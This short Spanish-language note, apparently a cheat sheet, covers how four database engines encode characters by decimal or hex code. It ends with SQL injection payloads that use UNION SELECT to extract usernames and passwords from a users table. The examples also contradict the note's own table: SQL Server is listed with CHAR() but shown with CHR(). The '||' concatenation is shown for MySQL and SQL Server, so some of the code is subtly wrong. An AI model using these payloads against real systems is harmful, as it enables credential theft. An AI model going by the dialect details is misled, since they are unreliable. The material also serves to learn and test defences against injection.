# Representación de caracteres en motores de base de datos

En cada motor de base de datos, se utilizan distintos métodos para representar caracteres en formato hexadecimal o decimal. 

## ¿Cómo se manejan los valores ASCII en cada uno de los motores de base de datos más comunes?

### Resumen de la diferencia entre los motores de bases de datos:

| Motor de DB    | Función para caracteres en formato decimal | Función para caracteres en formato hexadecimal |
|----------------|--------------------------------------------|-------------------------------------------------|
| **MySQL**      | `CHAR()` (con valor decimal)               | `0xNN` (valor hexadecimal)                      |
| **Oracle**     | `CHR()` (con valor decimal)                | No se usa formato hexadecimal directamente     |
| **PostgreSQL** | `CHR()` (con valor decimal)                | No se usa formato hexadecimal directamente     |
| **SQL Server** | `CHAR()` (con valor decimal)               | No se usa formato hexadecimal directamente     |

### Ejemplos: 

**Nota:** Para dos puntos -->   :

**MySQL**:

```sql
' UNION SELECT NULL, username || 0x3a || password FROM users--'
```

**Oracle/PostgreSQL/SQL Server:**

```SQL
' UNION SELECT NULL, username || CHR(58) || password FROM users--'
```
